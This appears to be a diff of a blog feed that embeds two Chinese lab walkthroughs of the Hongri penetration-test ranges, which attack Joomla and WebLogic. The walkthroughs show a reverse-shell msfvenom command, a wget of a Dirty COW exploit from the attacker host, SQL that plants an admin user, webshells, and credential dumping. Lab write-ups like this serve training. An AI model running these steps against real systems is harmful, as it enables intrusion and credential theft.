@@ -6,7 +6,7 @@
     
             <link href="https://l1uyun.one/tags/sec/win/" rel="alternate" type="text/html" title="html" />
             <link href="https://l1uyun.one/tags/sec/win/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
-    <updated>2025-09-03T01:13:55+00:00</updated>
+    <updated>2025-09-04T12:43:56+00:00</updated>
     
     
     
@@ -46,22 +46,52 @@
 <h2 id="外网">外网</h2>
 <p>访问192.168.3.3</p>
 <h3 id="信息收集">信息收集</h3>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_1.png" alt=""  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_1.png" alt="" /></figure>
+
+
+
 joomla cms
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_2.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_2.png" alt="" /></figure>
+
+
+
 这个cms之前打靶机的时候遇见过
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_3.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_3.png" alt="" /></figure>
+
+
+
 在README.txt中发现了版本信息(在http://192.168.3.3/administrator/manifests/files/joomla.xml中也有)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_4.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_4.png" alt="" /></figure>
+
+
+
 在exploit-db中查找一下,先看看两个sql注入,RealEstateManager和VehicleManager组件的,但是这台机器,这两个组件都没有</p>
 <p>后台弱口令登录失败,跑一下爆破脚本</p>
 <p>继续找一下nday,尝试了一下,没啥进展</p>
 <h3 id="数据库凭据泄露">数据库凭据泄露</h3>
 <p>回到目录扫描
 御剑扫一下
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_5.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_5.png" alt="" /></figure>
+
+
+
 phpinfo
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_6.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_6.png" alt="" /></figure>
+
+
+
 电脑卡起来了,御剑崩了,换成dirsearch,扫到了下面这个文件
 <code>http://192.168.3.3/configuration.php~</code>
 里面有数据库的账号密码</p>
@@ -72,7 +102,12 @@ phpinfo
 </span></span><span style="display:flex;"><span>	public $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;joomla&#39;</span>;
 </span></span><span style="display:flex;"><span>	public $dbprefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;am2zu_&#39;</span>;
 </span></span></code></pre></div><p>navicat连一下
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_7.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_7.png" alt="" /></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin
 </span></span><span style="display:flex;"><span>$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy
 </span></span><span style="display:flex;"><span>
@@ -88,18 +123,43 @@ phpinfo
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_user_usergroup_map<span style="color:#f92672">`</span> (<span style="color:#f92672">`</span>user_id<span style="color:#f92672">`</span>,<span style="color:#f92672">`</span>group_id<span style="color:#f92672">`</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (LAST_INSERT_ID(),<span style="color:#e6db74">&#39;8&#39;</span>);
 </span></span></code></pre></div><p>然后使用admin2:secret登录进入后台
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_8.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_8.png" alt="" /></figure>
+
+
+</p>
 <h3 id="后台模板getshell">后台模板getshell</h3>
 <p>上传webshell,这里生成的是蚁剑的
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_9.png" alt="|500"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_9.png" alt="|500" /><figcaption>|500</figcaption></figure>
+
+
+
 修改error.php,并保存
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_10.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_10.png" alt="" /></figure>
+
+
+
 路径是<code>http://192.168.3.3/templates/beez3/error.php</code></p>
 <h3 id="antsword">antsword</h3>
 <p>连上去了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_11.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_11.png" alt="" /></figure>
+
+
+
 加载插件之后执行命令
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_12.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_12.png" alt="" /></figure>
+
+
+
 存在内网ip 192.168.93.120</p>
 <p>传到msf里面吧</p>
 <pre tabindex="0"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.100 LPORT=4444 -f elf -o shell.elf
@@ -152,7 +212,12 @@ phpinfo
 </span></span></code></pre></div><h3 id="提权">提权</h3>
 <p>接下来要对内网的机器进一步渗透,这台公网机器需要作为跳板机,先得拿下root</p>
 <p>尝试一下脏牛
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_13.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_13.png" alt="" /></figure>
+
+
+</p>
 <p>上传.c文件,将文件里面的用户名改成root</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ wget 192.168.3.100/dirty.c
 </span></span><span style="display:flex;"><span>--2019-10-06 22:57:45--  http://192.168.3.100/dirty.c
@@ -180,7 +245,12 @@ phpinfo
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
 </span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 </span></span></code></pre></div><p>拿下root,将shell传到msf中,<a href="https://www.revshells.com" target="_blank" rel="noopener nofollow noreferrer" >msfvenom</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_14.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_14.png" alt="" /></figure>
+
+
+</p>
 <h3 id="搭建socks隧道">搭建socks隧道</h3>
 <p>参考之前在红日1里面的笔记<a href="%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f.md###%e6%90%ad%e5%bb%basocks%e9%9a%a7%e9%81%93">红日靶场1-win域</a></p>
 <pre tabindex="0"><code>run post/multi/manage/autoroute
@@ -232,9 +302,19 @@ Jobs
 </span></span><span style="display:flex;"><span>3306/tcp open   mysql
 </span></span><span style="display:flex;"><span>9191/tcp closed sun-as-jpda
 </span></span></code></pre></div><p>现在再回到蚁剑的后渗透模块,设置代理,使用bind-shell,传回msf
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_15.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_15.png" alt="" /></figure>
+
+
+
 linux的两台机器拿到了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_16.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_16.png" alt="" /></figure>
+
+
+
 还剩下三台win机器</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.93.10
 </span></span><span style="display:flex;"><span>192.168.93.20
@@ -397,7 +477,12 @@ linux的两台机器拿到了
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;100i 123qwe!ASD&#39;</span> rockyou.txt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>administrator:123qwe!ASD
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_17.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_17.png" alt="" /></figure>
+
+
+
 附上其他师傅的横向思路</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1、mssql要是拿到高权限（sa账号权限）可以尝试通过mssql写 shell 然后提权。
 </span></span><span style="display:flex;"><span>2、在进行横向移动时，内网设备扫不出来其他漏洞，只能通过 SMB 爆破或者 NTLM Relay 攻击，SMB 爆破比较碰运气，在实际过程中可以通过收集公司及管理员信息生成对应字典；NTLM Relay 攻击类似社工钓鱼，遇到安全意识不高的管理员才有可能成功，并且在内网环境中安装Python和对应的库也是比较麻烦的，可以考虑使用 conda 等创建虚拟环境，然后一起打包上传到对应靶机，但是相应的环境配置也是比较容易出问题。
@@ -499,11 +584,26 @@ linux的两台机器拿到了
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>sc <span style="color:#ae81ff">\\</span>192.168.93.10 start unablefirewall
 </span></span></code></pre></div><p>然后在使用msf的psexec模块拿shell
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_18.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_18.png" alt="" /></figure>
+
+
+</p>
 <p>发现还有不少东西要学,win和linux的免杀,win域渗透,权限维持&hellip;.我还要继续学下去吗,已经沉没的比较多了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_19.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_19.png" alt="" /></figure>
+
+
+</p>
 <p>最后偷一张拓扑图
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_20.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_20.png" alt="" /></figure>
+
+
+</p>
 <h1 id="引用">引用</h1>
 <p><a href="https://blog.csdn.net/qq_47289634/article/details/132021341" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/qq_47289634/article/details/132021341</a></p>
 <p><a href="https://blog.csdn.net/2301_76227305/article/details/139067562" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/2301_76227305/article/details/139067562</a></p>
@@ -542,44 +642,99 @@ linux的两台机器拿到了
 <p>环境和红日1的环境搭建差不多，不过这次给三台机器分别是域控、web服务器、个人PC机，与红日1不同的是这里将域管换成了个人PC机，因此我们的一些操作也会有所不同</p>
 <h1 id="红日靶场2_win域">红日靶场2_win域</h1>
 <h2 id="搭建环境">搭建环境</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_1.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_1.png" alt="" /></figure>
+
+
+</p>
 <pre tabindex="0"><code>administrator
 1qaz@WSX
 默认密码都是1qaz@WSX
 </code></pre><p>这里需要模拟内网环境,所以需要弄一个内网网卡</p>
 <p>创建一个vmnet2
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_2.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_2.png" alt="" /></figure>
+
+
+</p>
 <p>然后把三台机器的网卡2都改成这个vmnet2就行了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_3.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_3.png" alt="" /></figure>
+
+
+
 DC机器不需要做什么处理,改完网卡直接启动就行</p>
 <p>这里的另外一个网卡,作者设置的是111网段,但是我习惯了自己的ip,所以选择改pc和web两台机器里面的ip</p>
 <p>先改一下pc这台机器,这台先改下ip
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_4.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_4.png" alt="" /></figure>
+
+
+
 再测试一下连通性,使用外部的parrot机器ping一下,没通,需要关闭防火墙
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_5.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_5.png" alt="" /></figure>
+
+
+</p>
 <p>最后配置web机器,web机器需要先将恢复快照1.3版本
 会出现一个报错,直接点放弃就行,<strong>这里恢复快照之后,需要重新改网卡,怪不得ping不通域控的</strong></p>
 <p>登录本地用户</p>
 <pre tabindex="0"><code>.\de1ay
 1qaz@WSX
 </code></pre><p>这里提示需要修改密码,我改成1qaz@WSX3
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_6.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_6.png" alt="" /></figure>
+
+
+
 进去之后直接注销掉,切换成域用户mssql,密码还是1qaz@WSX</p>
 <p>然后还是先改ip
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_7.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_7.png" alt="" /></figure>
+
+
+</p>
 <p>改完之后测试一下两个网段都能不能ping通</p>
 <p>ping不通的话得关一下web的防火墙,关掉之后就能ping通了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_8.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_8.png" alt="" /></figure>
+
+
+</p>
 <p>红日1是以phpstudy搭的一个web服务，红日2用的是weblogic。web服务中，我们需要手动打开weblogic</p>
 <p>进入这个路径<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>,没权限的时候,输管理员凭据就行.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_9.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_9.png" alt="" /></figure>
+
+
+
 以管理员身份启动一下weblogic
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_10.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_10.png" alt="" /></figure>
+
+
+</p>
 <p>搭建时参考的文章提到:
 WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动（Computer Browser 是关闭的,导致 net view 显示 6118 error 没能解决，在域信息收集时暂时关闭一下防火墙）</p>
 <p>我这里web里的Computer Browser是关闭的,我手动打开了,pc机器是正常的.</p>
 <p>访问192.168.3.80:7001/console,跳转进去登录页面,环境搭建成功
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_11.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_11.png" alt="" /></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web 192.168.3.80
 </span></span><span style="display:flex;"><span>pc  192.168.3.201
 </span></span><span style="display:flex;"><span>win 192.168.3.99
@@ -715,26 +870,71 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
 <a href="weblogic-wls-wsat-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e.md">weblogic-wls-wsat-反序列化漏洞</a>
 这个检测脚本卡主了,上一键利用工具了</p>
 <p>CVE-2016-0638
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_12.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_13.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_12.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_13.png" alt="" /></figure>
+
+
+</p>
 <h3 id="antsword_内存马">antsword_内存马</h3>
 <p>使用这个工具里面的内存马,上传antsword_Custom_Filter内存马</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_14.png" alt="|650"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_14.png" alt="|650" /><figcaption>|650</figcaption></figure>
+
+
+</p>
 <p>进去之后查看ip,是存在内网环境的
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_15.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_15.png" alt="" /></figure>
+
+
+</p>
 <h2 id="内网">内网</h2>
 <p>这里还有一台PC机器是暴露在外网环境中的,但是已经拿了web机器的shell,就先进内网</p>
 <h3 id="信息收集-1">信息收集</h3>
 <p>局域网机器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_16.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_16.png" alt="" /></figure>
+
+
+
 本机信息
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_17.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_17.png" alt="" /></figure>
+
+
+
 无法查看域用户
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_18.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_18.png" alt="" /></figure>
+
+
+
 本地管理员组,这里面有域用户DE1AY\Domain Admins这个域用户
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_19.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_19.png" alt="" /></figure>
+
+
+
 域信息
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_20.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_20.png" alt="" /></figure>
+
+
+</p>
 <h3 id="cs上线">CS上线</h3>
 <p>添加监听器</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>name：为监听器名字，可任意
@@ -742,23 +942,63 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
 </span></span><span style="display:flex;"><span>HTTP Hosts: shell反弹的主机，也就是我们kali的ip（如果是阿里云，则填阿里云主机的公网ip）
 </span></span><span style="display:flex;"><span>HTTP Hosts(Stager): Stager的马请求下载payload的地址（一般也是和上面的ip填一样）
 </span></span><span style="display:flex;"><span>HTTP Port(C2): C2监听的端口
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_21.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_21.png" alt="" /></figure>
+
+
+
 创建payload
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_22.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_22.png" alt="" /></figure>
+
+
+
 上传马子,将shell传到cs上
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_23.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_23.png" alt="" /></figure>
+
+
+</p>
 <p>获取明文凭据
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_24.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_24.png" alt="" /></figure>
+
+
+</p>
 <p>rdp也能连上去
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_25.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_25.png" alt="" /></figure>
+
+
+
 噢,简称和完整域名的区别
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_26.png" alt=""  /></p>
+
+<figure class="md-figure">
